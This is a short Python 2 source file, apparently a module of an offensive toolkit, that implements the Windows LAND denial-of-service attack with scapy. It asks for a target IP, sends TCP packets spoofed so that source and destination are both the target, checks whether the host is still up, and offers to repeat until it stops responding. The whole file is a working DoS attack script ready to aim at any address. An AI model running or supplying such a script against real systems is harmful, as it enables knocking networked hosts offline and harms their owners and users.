from scapy.all import *
from dos import DoS
import util

#
# Module exploits the Windows LAND attack.  This DoS essentially sends a packet with the source and destination
# as the target host, so it will send itself packets infinitely until crash.
# Original cvs here: http://insecure.org/sploits/land.ip.DOS.html
#
__name__ = 'LAND DoS'
class LANDDoS(DoS):
	def __init__(self):
		super(LANDDoS,self).__init__('LAND DoS')

	def initialize(self):
		# supress scapy output
		conf.verb = 0

		try:
			self.target = raw_input('[!] Enter IP to DoS: ')
			tmp = raw_input('[!] LAND attack at ip %s.  Is this correct? '%self.target)
			if 'n' in tmp.lower():
				return

			while True:
				print '[!] DoSing %s...'%self.target
				send(IP(src=self.target,dst=self.target)/TCP(sport=134, dport=134))

				if self.is_alive():
					util.Msg('Host appears to still be up.')
					try:
						tmp = raw_input('[!] Try again? ')
					except Exception:
						break
					if 'n' in tmp.lower():
						break
				else:
					util.Msg('Host not responding!')
					break
		except Exception, j:
			util.Error('Error: %s'%j)
			return
